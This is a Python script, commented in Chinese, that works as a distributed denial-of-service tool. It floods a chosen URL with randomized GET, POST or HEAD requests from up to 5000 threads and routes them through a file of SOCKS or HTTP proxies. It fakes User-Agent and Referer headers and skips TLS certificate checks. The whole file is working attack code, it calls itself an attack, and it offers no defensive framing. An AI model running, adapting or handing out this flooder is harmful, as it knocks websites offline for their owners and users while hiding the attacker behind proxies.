import datetime
import os
import random
import socket
import ssl
import sys
import threading
import time
import requests
import socks
from contextlib import contextmanager
import logging

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 预定义 Accept 和 Referer 头部
ACCEPT_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
]

@contextmanager
def managed_socket(sock):
    """安全的socket资源管理器"""
    try:
        yield sock
    finally:
        try:
            sock.close()
        except (socket.error, OSError):
            pass

def validate_args(args):
    """验证命令行参数"""
    required = ["-url"]
    for req in required:
        if req not in args:
            raise ValueError(f"Missing required argument: {req}")
    
    # 验证线程数范围
    thread_count = int(args.get("-t", 1000))
    if not 1 <= thread_count <= 5000:
        raise ValueError("Thread count must be between 1 and 5000")
    
    # 验证代理类型
    proxy_type = int(args.get("-v", 5))
    if proxy_type not in [0, 4, 5]:
        raise ValueError("Proxy type must be 0 (HTTP), 4 (SOCKS4), or 5 (SOCKS5)")

def get_random_user_agent():
    """生成随机 User-Agent"""
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    os_version = {
        'Macintosh': random.choice(['68K', 'PPC', 'Intel Mac OS X']),
        'Windows': random.choice([
            'Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1',
            'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2',
            'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'
        ]),
        'X11': random.choice(['Linux i686', 'Linux x86_64'])
    }[platform]

    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = f"{random.randint(0, 99)}.0{random.randint(0, 9999)}.{random.randint(0, 999)}"
        return f"Mozilla/5.0 ({os_version}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}"
    elif browser == 'firefox':
        year = str(random.randint(2020, datetime.date.today().year))
        month = f"{random.randint(1, 12):02d}"
        day = f"{random.randint(1, 30):02d}"
        gecko = f"{year}{month}{day}"
        version = f"{random.randint(1, 72)}.0"
        return f"Mozilla/5.0 ({os_version}; rv:{version}) Gecko/{gecko} Firefox/{version}"
    elif browser == 'ie':
        version = f"{random.randint(1, 99)}.0"
        engine = f"{random.randint(1, 99)}.0"
        token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + "; " if random.choice([True, False]) else ""
        return f"Mozilla/5.0 (compatible; MSIE {version}; {os_version}; {token}Trident/{engine})"

def generate_random_url():
    """生成随机 URL 参数"""
    return str(random.randint(0, 271400281257))

def parse_url(url):
    """解析目标 URL 并返回协议、主机、端口和路径"""
    url = url.strip()
    if url.startswith("http://"):
        protocol = "http"
        host_part = url[7:]
    elif url.startswith("https://"):
        protocol = "https"
        host_part = url[8:]
    else:
        raise ValueError("Invalid URL format")

    parts = host_part.split("/", 1)
    host_and_port = parts[0]
    path = "/" + parts[1] if len(parts) > 1 else "/"

    if ":" in host_and_port:
        host, port = host_and_port.split(":")
        port = int(port)
    else:
        host = host_and_port
        port = 443 if protocol == "https" else 80

    return protocol, host, port, path

def create_secure_ssl_context():
    """创建安全的SSL上下文"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

# 攻击函数统一入口
def attack_worker(mode, event, proxy_type, proxies, target_info):
    """通用攻击工作线程"""
    protocol, host, port, path = target_info
    proxy = random.choice(proxies).strip().split(":")
    add_query = "?" if "?" in path else "&"
    event.wait()

    while True:
        sock = None
        try:
            sock = socks.socksocket()
            if proxy_type == 4:
                sock.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
            elif proxy_type == 5:
                sock.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            elif proxy_type == 0:
                sock.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))

            sock.settimeout(5)  # 增加超时时间
            
            with managed_socket(sock):
                sock.connect((host, port))

                if protocol == "https":
                    context = create_secure_ssl_context()
                    secure_sock = context.wrap_socket(sock, server_hostname=host)
                    sock = secure_sock

                for _ in range(50):  # 减少请求次数
                    request = ""
                    
                    if mode == "get":
                        request = (
                            f"GET {path}{add_query}{generate_random_url()} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {get_random_user_agent()}\r\n"
                            f"{random.choice(ACCEPT_HEADERS)}\r\n"
                        )
                    elif mode == "post":
                        request = (
                            f"POST {path} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"X-Requested-With: XMLHttpRequest\r\n"
                            f"User-Agent: {get_random_user_agent()}\r\n"
                            f"{random.choice(ACCEPT_HEADERS)}\r\n"
                            f"Content-Length: {len(generate_random_url())}\r\n\r\n"
                            f"{generate_random_url()}\r\n\r\n"
                        )
                    elif mode == "head":
                        request = (
                            f"HEAD {path}{add_query}{generate_random_url()} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {get_random_user_agent()}\r\n"
                            f"{random.choice(ACCEPT_HEADERS)}\r\n"
                        )
                    else:
                        logger.warning(f"Unsupported mode: {mode}")
                        break

                    if request:
                        sock.send(request.encode())
                        
        except (socket.error, ConnectionError, ssl.SSLError, OSError) as e:
            logger.error(f"Connection failed: {e}")
        except (UnicodeEncodeError, AttributeError) as e:
            logger.error(f"Encoding or attribute error: {e}")
        except TimeoutError as e:
            logger.error(f"Socket timeout: {e}")
        except Exception as e:
            logger.error(f"Unexpected error: {e}")

# 主程序入口
def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py -url <target_url> [-m mode] [-t threads] [-v proxy_type] [-f proxy_file] [-s duration]")
        return

    try:
        # 解析命令行参数
        args = dict(zip(sys.argv[1::2], sys.argv[2::2]))
        validate_args(args)
        
        target_url = args.get("-url")
        mode = args.get("-m", "get")  # 默认改为get模式
        thread_count = int(args.get("-t", 100))  # 降低默认线程数
        proxy_type = int(args.get("-v", 5))
        duration = int(args.get("-s", 60))  # 默认持续时间

        protocol, host, port, path = parse_url(target_url)

        # 加载代理列表
        proxy_file = args.get("-f", "proxy.txt")
        if not os.path.exists(proxy_file):
            logger.error("Proxy file not found!")
            return

        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if ":" in line and len(line.strip()) > 0]

        if not proxies:
            logger.error("No valid proxies found!")
            return

        logger.info(f"Loaded {len(proxies)} proxies.")

        # 启动攻击线程
        event = threading.Event()
        threads = []

        logger.info(f"Starting {mode} attack with {thread_count} threads...")
        for _ in range(thread_count):
            t = threading.Thread(
                target=attack_worker,
                args=(mode, event, proxy_type, proxies, (protocol, host, port, path)),
                daemon=True
            )
            t.start()
            threads.append(t)

        event.set()
        time.sleep(duration)
        logger.info("Attack completed.")

    except ValueError as e:
        logger.error(f"Configuration error: {e}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()